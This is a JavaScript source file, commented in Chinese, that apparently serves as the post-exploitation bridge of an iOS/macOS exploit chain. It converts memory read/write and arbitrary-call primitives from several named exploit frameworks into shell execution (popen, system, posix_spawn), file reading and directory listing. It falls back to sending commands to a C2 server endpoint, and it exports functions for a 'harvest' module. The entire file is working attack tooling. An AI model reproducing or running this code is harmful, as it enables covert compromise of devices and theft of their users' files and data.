/**
 * native_bridge_universal.js — 通用原生桥接层
 *
 * 支持多种 exploit 框架：
 *   - Native.callSymbol (liangri/anye/coruna-fused)
 *   - obChTK (mos0027)
 *   - p.read64/p.write64 (generic)
 *   - fcall (generic) — 含字符串指针自动转换
 *   - XHR /shell 回退 (server端execSync)
 *
 * 加载后提供统一接口：execShell, readFile, listFiles
 */
(function () {
  'use strict';

  var _c2Endpoint = (typeof globalThis !== 'undefined' && typeof globalThis.DS_C2_ENDPOINT === 'function')
    ? globalThis.DS_C2_ENDPOINT : function () { return ''; };
  var _c2Enabled = !!(typeof globalThis !== 'undefined' && globalThis.C2_CONFIG && globalThis.C2_CONFIG.c2Enabled);

  var BRIDGE_OK = false;

  /* ── 尝试1: Native.callSymbol (liangri/anye) ─────────────────── */
  function tryNative() {
    if (typeof Native === 'undefined') return false;
    if (typeof Native.callSymbol !== 'function') return false;
    if (!Native.mem || !Native.memSize) return false;

    globalThis.nativeExecShell = function (cmd) {
      if (!_c2Enabled) return '[C2 disabled]';
      try {
        return Native.callSymbol('popen', cmd);
      } catch (e) {
        return '[nativeExecShell error] ' + (e.message || String(e));
      }
    };

    globalThis.nativeReadFile = function (path, maxBytes) {
      maxBytes = maxBytes || 512 * 1024;
      try {
        var fd = Native.callSymbol('open', path, 0);
        if (!fd || fd === -1) return null;
        var chunks = [];
        var total = 0;
        var CHUNK = Math.min(Native.memSize, 0x4000);
        while (total < maxBytes) {
          var toRead = Math.min(CHUNK, maxBytes - total);
          var n = Native.callSymbol('read', fd, Native.mem, toRead);
          if (!n || n <= 0) break;
          var ab = Native.read(Native.mem, n);
          if (!ab || !ab.byteLength) break;
          chunks.push(new Uint8Array(ab));
          total += n;
        }
        Native.callSymbol('close', fd);
        // 正确合并 Uint8Array (修复 chunks.join('') 对ArrayBuffer产生"[object ArrayBuffer]"的bug)
        var merged = new Uint8Array(total);
        var off = 0;
        for (var ci = 0; ci < chunks.length; ci++) { merged.set(chunks[ci], off); off += chunks[ci].length; }
        var out = '';
        for (var bi = 0; bi < merged.length; bi++) out += String.fromCharCode(merged[bi]);
        return out;
      } catch (e) {
        return null;
      }
    };

    globalThis.nativeListDir = function (path) {
      try {
        var out = Native.callSymbol('popen', 'ls -1a "' + String(path).replace(/"/g, '\\"') + '" 2>/dev/null');
        if (!out) return [];
        return out.trim().split('\n').filter(Boolean);
      } catch (e) {
        return [];
      }
    };

    globalThis.nativeBridgeReady = true;
    globalThis.nativeBridgeType = 'Native.callSymbol';
    return true;
  }

  /* ── 尝试2: obChTK (mos0027) ────────────────────────────────── */
  function tryObChTK() {
    try {
      if (typeof globalThis.obChTK === 'undefined') return false;
      var tk = globalThis.obChTK;

      if (typeof tk === 'function') {
        globalThis._obChTK_raw = tk;
      }

      if (typeof tk.Ki === 'function' && typeof tk.Hi === 'function') {
        globalThis._krw = tk;
        globalThis.nativeBridgeReady = true;
        globalThis.nativeBridgeType = 'obChTK-direct';
        return true;
      }

      if (typeof tk.si === 'function') {
        globalThis._shellExec = tk.si;
        globalThis.nativeBridgeReady = true;
        globalThis.nativeBridgeType = 'obChTK-shellcode';
        return true;
      }

      return false;
    } catch (e) {
      return false;
    }
  }

  /* ── 尝试3: 通用的 kernel R/W 检测 ───────────────────────────── */
  function tryGenericKRW() {
    // 桥接 p.fcall → globalThis.fcall (pe_main.js 只导出 p.fcall, 不导出全局 fcall)
    var _p = (typeof globalThis.p !== 'undefined' && globalThis.p) || (typeof window !== 'undefined' && window.p) || null;
    if (_p && typeof _p.fcall === 'function' && typeof globalThis.fcall !== 'function') {
      globalThis.fcall = function(){ return _p.fcall.apply(_p, arguments); };
      try { if (typeof print === 'function') print('[bridge_universal] bridged p.fcall -> globalThis.fcall'); } catch(_e) {}
    }

    // 检查是否有 {read64, write64} 原语
    if (_p && typeof _p.read64 === 'function' && typeof _p.write64 === 'function') {
      globalThis._krw2 = _p;
      globalThis.nativeBridgeReady = true;
      globalThis.nativeBridgeType = 'p.read64/write64';
      globalThis._fcall = globalThis.fcall;
      return true;
    }

    // 检查 fcall — 用 kernel primitives 实现 shell/文件操作
    if (typeof globalThis.fcall === 'function' || (_p && typeof _p.fcall === 'function')) {
      if (!globalThis._fcall) globalThis._fcall = globalThis.fcall || (function(){ return _p.fcall.apply(_p, arguments); });
      globalThis.nativeBridgeReady = true;
      globalThis.nativeBridgeType = 'fcall';

      // ═══ 符号缓存 ═══
      var _symCache = {};
      function _getSym(name) {
        if (_symCache[name]) return _symCache[name];
        try {
          if (typeof func_resolve === 'function') {
            var addr = func_resolve(name);
            if (addr && Number(addr) > 0) { _symCache[name] = addr; return addr; }
          }
        } catch(e) {}
        try {
          if (typeof globalThis._STATIC_SYMS_1583 !== 'undefined') {
            var S = globalThis._STATIC_SYMS_1583;
            var a = S[name] || S['_' + name];
            if (a) { _symCache[name] = a; return a; }
          }
        } catch(e) {}
        return 0;
      }

      // ═══ fcall wrapper — 确保所有参数是 BigInt，自动转换 Number ═══
      var _fcallBridged = (typeof p !== 'undefined' && p && typeof p.fcall === 'function');
      function _fcallSafe(addr) {
        var _addr = typeof addr === 'bigint' ? addr : BigInt(Math.floor(Number(addr)));
        if (_addr === 0n) return 0;
        try {
          var _f = (_fcallBridged && p.fcall) || fcall;
          var a = [];
          for (var i = 1; i < arguments.length; i++) {
            var arg = arguments[i];
            if (typeof arg === 'number') a.push(BigInt(Math.floor(arg)));
            else if (typeof arg === 'bigint') a.push(arg);
            else a.push(arg);
          }
          return _f.apply(p || null, [_addr].concat(a));
        } catch(e) {
          try { if (typeof print === 'function') print('[bridge] fcall err: ' + (e.message||e)); } catch(_) {}
          return 0;
        }
      }

      // ═══ 字符串→指针: malloc + p.write8 ═══
      var _strPtrCache = {};
      globalThis._bridgeFreeCStrings = function() {
        var freeAddr = _getSym('free');
        if (!freeAddr) { _strPtrCache = {}; return; }
        try {
          var keys = Object.keys(_strPtrCache);
          for (var ki = 0; ki < keys.length; ki++) {
            _fcallSafe(freeAddr, _strPtrCache[keys[ki]]);
          }
        } catch(e) {}
        _strPtrCache = {};
      };

      function _strToPtr(str) {
        if (!str || typeof str !== 'string') return 0n;
        if (_strPtrCache[str]) return _strPtrCache[str];
        var mallocAddr = _getSym('malloc');
        if (!mallocAddr) return 0n;
        var len = str.length + 1;
        var buf = _fcallSafe(mallocAddr, len);
        if (!buf || Number(buf) === 0) return 0n;
        try {
          for (var si = 0; si < str.length; si++) {
            p.write8(buf + BigInt(si), str.charCodeAt(si));
          }
          p.write8(buf + BigInt(str.length), 0);
        } catch(e) { return 0n; }
        _strPtrCache[str] = buf;
        return buf;
      }

      // ═══ Dynamic symbol resolver via dlopen/dlsym ═══
      var _libcHandle = 0;
      function _resolveLibc() {
        if (_libcHandle) return _libcHandle;
        try {
          var dlopenAddr = _getSym('dlopen');
          if (!dlopenAddr) return 0;
          // dlopen("libSystem.B.dylib", RTLD_LAZY=1) — 使用字符串指针
          var libPath = '/usr/lib/libSystem.B.dylib';
          var pathPtr = _strToPtr(libPath);
          if (!pathPtr) return 0;
          _libcHandle = _fcallSafe(dlopenAddr, pathPtr, 1);
          if (!_libcHandle || Number(_libcHandle) === 0) {
            var libcPtr = _strToPtr('/usr/lib/libc.dylib');
            if (libcPtr) {
              _libcHandle = _fcallSafe(dlopenAddr, libcPtr, 1);
            }
          }
          return _libcHandle;
        } catch(e) { return 0; }
      }

      function _dlsym(name) {
        // Try static table first (fast path)
        var s = _getSym(name);
        if (s) return s;
        // Dynamic resolve via dlsym — 使用字符串指针
        try {
          var h = _resolveLibc();
          if (!h || Number(h) === 0) return 0;
          var dlsymAddr = _getSym('dlsym');
          if (!dlsymAddr) return 0;
          var namePtr = _strToPtr(name);
          if (!namePtr) return 0;
          var addr = _fcallSafe(dlsymAddr, h, namePtr);
          if (addr && Number(addr) > 0x1000) {
            _symCache[name] = addr;
            return addr;
          }
        } catch(e) {}
        return 0;
      }

      // ═══ fcall-based execShell ═══
      globalThis.nativeExecShell = function (cmd) {
        try {
          var cmdPtr = _strToPtr(cmd);
          if (!cmdPtr) return '[fcall] str2ptr failed for cmd';

          // Strategy 1: popen via dynamic dlsym (with proper string ptr)
          var popenAddr = _dlsym('popen');
          if (popenAddr) {
            var modePtr = _strToPtr('r');
            var fp = _fcallSafe(popenAddr, cmdPtr, modePtr);
            if (fp && Number(fp) > 0x1000) {
              // fread to get output
              var bufSize = 32768;
              var freadAddr = _dlsym('fread');
              var mallocAddr = _getSym('malloc');
              var freeAddr = _getSym('free');
              if (freadAddr && mallocAddr) {
                var buf = _fcallSafe(mallocAddr, bufSize);
                if (buf && Number(buf) > 0) {
                  var sizePtr = _strToPtr('\x01'.repeat(8)); // dummy
                  var n = _fcallSafe(freadAddr, buf, 1n, 16384n, fp);
                  var out = '';
                  if (n && Number(n) > 0) {
                    try {
                      for (var i = 0; i < Math.min(Number(n), 16384); i++) {
                        var b = Number(p.read8(buf + BigInt(i)));
                        if (b === 0) break;
                        out += String.fromCharCode(b);
                      }
                    } catch(e2) {}
                  }
                  _fcallSafe(freeAddr, buf);
                  var pcloseAddr = _dlsym('pclose');
                  if (pcloseAddr) _fcallSafe(pcloseAddr, fp);
                  if (out) return out;
                } else {
                  _fcallSafe(freeAddr, buf);
                }
              }
              var pcloseAddr2 = _dlsym('pclose');
              if (pcloseAddr2) _fcallSafe(pcloseAddr2, fp);
            }
          }

          // Strategy 2: system(cmd) via dlsym
          var sysAddr = _dlsym('system');
          if (sysAddr) {
            var sysRet = _fcallSafe(sysAddr, cmdPtr);
            return '[system] cmd executed, ret=' + Number(sysRet);
          }

          // Strategy 3: posix_spawn
          var posixSpawnAddr = _dlsym('posix_spawn');
          if (posixSpawnAddr) {
            // Try posix_spawn with /bin/sh -c
            var shPathPtr = _strToPtr('/bin/sh');
            var shArg0Ptr = _strToPtr('sh');
            var shArg1Ptr = _strToPtr('-c');
            if (shPathPtr && shArg0Ptr && shArg1Ptr) {
              var ret = _fcallSafe(posixSpawnAddr, 0n, shPathPtr, 0n, 0n, shArg0Ptr, shArg1Ptr, cmdPtr, 0n);
              return '[posix_spawn] ret=' + Number(ret);
            }
          }

        } catch(e) { return '[fcall-execShell] ' + (e.message||e); }
        return '[fcall-execShell] all shell methods exhausted';
      };

      // ═══ fcall-based readFile — 用 open/read/close ═══
      globalThis.nativeReadFile = function (path, maxBytes) {
        maxBytes = maxBytes || 524288;
        try {
          var openAddr = _getSym('open');
          var readAddr = _getSym('read');
          var closeAddr = _getSym('close');
          var mallocAddr = _getSym('malloc');
          var freeAddr = _getSym('free');
          if (!openAddr || !readAddr) return null;

          var pathPtr = _strToPtr(path);
          if (!pathPtr) return null;
          var fd = _fcallSafe(openAddr, pathPtr, 0);
          if (!fd || Number(fd) < 0) return null;

          var bufSize = Math.min(maxBytes, 65536);
          var buf = _fcallSafe(mallocAddr, bufSize);
          if (!buf || Number(buf) === 0) { _fcallSafe(closeAddr, fd); return null; }

          var n = _fcallSafe(readAddr, fd, buf, bufSize);
          _fcallSafe(closeAddr, fd);
          if (!n || Number(n) <= 0) { _fcallSafe(freeAddr, buf); return null; }

          var out = '';
          try {
            for (var i = 0; i < Math.min(Number(n), maxBytes); i++) {
              var b = Number(p.read8(buf + BigInt(i)));
              out += String.fromCharCode(b);
            }
          } catch(e) { out = ''; }
          _fcallSafe(freeAddr, buf);
          return out || null;
        } catch(e) { return null; }
      };

      // ═══ fcall-based listDir — opendir/readdir 直接走fcall，不依赖popen ═══
      globalThis.nativeListDir = function (dirPath) {
        var _safePath = String(dirPath);
        try {
          var _od = _dlsym('opendir'), _rd = _dlsym('readdir'), _cd = _dlsym('closedir');
          if (_od && _rd && _cd) {
            var _p = _strToPtr(_safePath);
            if (_p) {
              var _d = _fcallSafe(_od, _p);
              if (_d && Number(_d) !== 0) {
                var _ents = [];
                for (var _i = 0; _i < 1000; _i++) {
                  var _e = _fcallSafe(_rd, _d);
                  if (!_e || Number(_e) === 0) break;
                  var _nm = '';
                  for (var _j = 0; _j < 256; _j++) {
                    var _b = Number(p.read8(_e + 21n + BigInt(_j)));
                    if (_b === 0) break;
                    _nm += String.fromCharCode(_b);
                  }
                  if (_nm && _nm !== '.' && _nm !== '..') _ents.push(_nm);
                }
                _fcallSafe(_cd, _d);
                if (_ents.length > 0) return _ents;
              }
            }
          }
        } catch(_e1) {}
        try {
          var _gd = _dlsym('getdirentries64'), _op = _dlsym('open'), _cl = _dlsym('close');
          var _ml = _getSym('malloc'), _fr = _getSym('free');
          if (_gd && _op && _ml) {
            var _pp = _strToPtr(_safePath);
            if (_pp) {
              var _fd = _fcallSafe(_op, _pp, 0x100000);
              if (_fd && Number(_fd) >= 0) {
                var _bs = 8192, _bp = _fcallSafe(_ml, 8);
                var _bf = _fcallSafe(_ml, _bs);
                if (_bf && Number(_bf) > 0 && _bp && Number(_bp) > 0) {
                  var _n = _fcallSafe(_gd, _fd, _bf, _bs, _bp);
                  var _ents = [];
                  if (_n && Number(_n) > 0) {
                    var _off = 0;
                    while (_off < Number(_n)) {
                      var _rl = Number(p.read16(_bf + BigInt(_off + 16)));
                      if (_rl === 0) break;
                      var _nm = '';
                      for (var _k = 0; _k < 256; _k++) {
                        var _b = Number(p.read8(_bf + BigInt(_off + 21 + _k)));
                        if (_b === 0) break;
                        _nm += String.fromCharCode(_b);
                      }
                      if (_nm && _nm !== '.' && _nm !== '..') _ents.push(_nm);
                      _off += _rl;
                    }
                  }
                  _fcallSafe(_fr, _bf); _fcallSafe(_fr, _bp);
                }
                _fcallSafe(_cl, _fd);
                if (_ents && _ents.length > 0) return _ents;
              }
            }
          }
        } catch(_e2) {}
        try {
          var _op2 = _dlsym('open'), _fdo = _dlsym('fdopendir');
          var _rd2 = _dlsym('readdir'), _cd2 = _dlsym('closedir');
          if (_op2 && _fdo && _rd2 && _cd2) {
            var _pp2 = _strToPtr(_safePath);
            if (_pp2) {
              var _fd2 = _fcallSafe(_op2, _pp2, 0);
              if (_fd2 && Number(_fd2) >= 0) {
                var _d2 = _fcallSafe(_fdo, _fd2);
                if (_d2 && Number(_d2) !== 0) {
                  var _ents = [];
                  for (var _i2 = 0; _i2 < 1000; _i2++) {
                    var _e2 = _fcallSafe(_rd2, _d2);
                    if (!_e2 || Number(_e2) === 0) break;
                    var _nm = '';
                    for (var _j2 = 0; _j2 < 256; _j2++) {
                      var _b2 = Number(p.read8(_e2 + 21n + BigInt(_j2)));
                      if (_b2 === 0) break;
                      _nm += String.fromCharCode(_b2);
                    }
                    if (_nm && _nm !== '.' && _nm !== '..') _ents.push(_nm);
                  }
                  _fcallSafe(_cd2, _d2);
                  if (_ents.length > 0) return _ents;
                }
              }
            }
          }
        } catch(_e3) {}
        var sp = String(dirPath).replace(/"/g, '\\"');
        var out = globalThis.nativeExecShell('ls -1a "' + sp + '" 2>/dev/null');
        if (!out || out.indexOf('[fcall') === 0) return [];
        return out.trim().split('\n').filter(Boolean);
      };

      // ═══ 自检：bridge装了，但能不能真正执行shell命令？═══
      try {
        if (typeof print === 'function') print('[bridge_universal] fcall shell/fs bridge installed, running self-test...');
      } catch(_e) {}

      // 快速自检：调用 echo 看看返回值是否包含预期内容
      var _testCmd = 'echo __BRIDGE_OK_' + Math.random().toString(36).slice(2,7) + '__';
      var _ok = false;
      try {
        var _out = globalThis.nativeExecShell(_testCmd);
        if (_out && _out.indexOf('BRIDGE_OK_') !== -1) {
          _ok = true;
        }
      } catch(_e) {}

      if (!_ok) {
        try { if (typeof print === 'function') print('[bridge_universal] fcall shell self-test FAILED — but fcall confirmed, keeping file I/O primitives active'); } catch(_e) {}
        // fcall 确认可用，即使 popen/echo 自检失败也保留 bridge
        // 文件 I/O (open/read/close) 走的是独立路径，不依赖 popen
        // 降级 execShell 用 system() 或直接标记不可用让上层用 readFile/listFiles
        if (!globalThis.nativeExecShell || globalThis.nativeExecShell('echo test').indexOf('[fcall') === 0) {
          // popen/system 都不可用，但文件IO可用 → 保留 bridge, execShell 返回明确错误
          globalThis.nativeExecShell = function(cmd) {
            return '[fcall-noshell] popen/system unavailable, use readFile/listFiles instead';
          };
        }
        // 不设 nativeBridgeReady=false! 保留 fcall 路径
      } else {
        try { if (typeof print === 'function') print('[bridge_universal] fcall shell self-test PASSED!'); } catch(_e) {}
      }
      return true;
    }

    return false;
  }

  /* ── 尝试4: 任何 execShell 已存在 ────────────────────────────── */
  function tryExistingExecShell() {
    if (typeof execShell === 'function') {
      globalThis.nativeExecShell = execShell;
      globalThis.nativeBridgeReady = true;
      globalThis.nativeBridgeType = 'existing-execShell';
      return true;
    }
    return false;
  }

  /* ── 尝试5: XMLHttpRequest-based shell (服务端回退) ──────────── */
  function tryXHRShell() {
    if (typeof XMLHttpRequest === 'undefined') return false;

    var _sharedSecret = 'YOUR_BEACON_SHARED_SECRET';

    globalThis.nativeExecShell = function (cmd) {
      try {
        var x = new XMLHttpRequest();
        var result = '';
        x.open('POST', _c2Endpoint('/api/liangri/shell'), false); // sync
        x.timeout = 10000;
        x.setRequestHeader('Content-Type', 'application/json');
        try { x.send(JSON.stringify({ cmd: cmd, token: _sharedSecret })); } catch(e) { return '[XHR send error] ' + (e.message || String(e)); }
        if (x.status === 200) {
          try {
            var r = JSON.parse(x.responseText);
            result = r.output || '';
          } catch (e) {
            result = x.responseText;
          }
        } else {
          result = '[XHR status=' + x.status + '] ' + (x.responseText || '').slice(0, 200);
        }
        return result;
      } catch (e) {
        return '[XHR shell error] ' + (e.message || String(e));
      }
    };

    globalThis.nativeReadFile = function (path, maxBytes) {
      try {
        var out = globalThis.nativeExecShell('cat "' + String(path).replace(/"/g, '\\"') + '" 2>/dev/null | head -c ' + (maxBytes || 65536));
        return out || null;
      } catch (e) { return null; }
    };

    globalThis.nativeListDir = function (path) {
      try {
        var out = globalThis.nativeExecShell('ls -1a "' + String(path).replace(/"/g, '\\"') + '" 2>/dev/null');
        if (!out || out.indexOf('[XHR') === 0) return [];
        return out.trim().split('\n').filter(Boolean);
      } catch (e) { return []; }
    };

    globalThis.nativeBridgeReady = true;
    globalThis.nativeBridgeType = 'XHR-shell';
    return true;
  }

  /* ── 按优先级尝试 ────────────────────────────────────────────── */
  if (tryNative()) {
    BRIDGE_OK = true;
  } else if (tryExistingExecShell()) {
    BRIDGE_OK = true;
  } else if (tryObChTK()) {
    BRIDGE_OK = true;
  } else if (tryGenericKRW()) {
    BRIDGE_OK = true;
  } else if (tryXHRShell()) {
    BRIDGE_OK = true;
  }

  /* ── 如果以上都不行，最后强制 XHR fallback ───────────────────── */
  if (!BRIDGE_OK || typeof globalThis.nativeExecShell !== 'function') {
    try { if (typeof print === 'function') print('[bridge_universal] All bridge methods failed, forcing XHR shell...'); } catch(_e) {}
    BRIDGE_OK = tryXHRShell();
  }

  /* ── 最终回退 ────────────────────────────────────────────────── */
  if (typeof globalThis.nativeExecShell !== 'function') {
    globalThis.nativeExecShell = function (cmd) {
      return '[native_bridge_universal] No shell execution method available (bridgeType=' + (globalThis.nativeBridgeType || 'none') + ')';
    };
  }

  if (typeof globalThis.nativeReadFile !== 'function') {
    globalThis.nativeReadFile = function (path) {
      var escaped = String(path).replace(/"/g, '\\"');
      return globalThis.nativeExecShell('cat "' + escaped + '" 2>/dev/null | head -c 524288');
    };
  }

  if (typeof globalThis.nativeListDir !== 'function') {
    globalThis.nativeListDir = function (path) {
      var out = globalThis.nativeExecShell('ls -1a "' + String(path).replace(/"/g, '\\"') + '" 2>/dev/null');
      if (!out) return [];
      return out.trim().split('\n').filter(Boolean);
    };
  }

  // 导出别名（harvest 模块用到的全局函数）
  globalThis.execShell  = globalThis.nativeExecShell;
  globalThis.readFile   = globalThis.nativeReadFile;
  globalThis.listFiles  = globalThis.nativeListDir;

  try {
    if (typeof print === 'function') {
      print('[bridge_universal] BridgeType=' + (globalThis.nativeBridgeType || 'none') + ' OK=' + BRIDGE_OK);
    }
  } catch (e) {}

  globalThis._universalBridgeOK = BRIDGE_OK;
})();
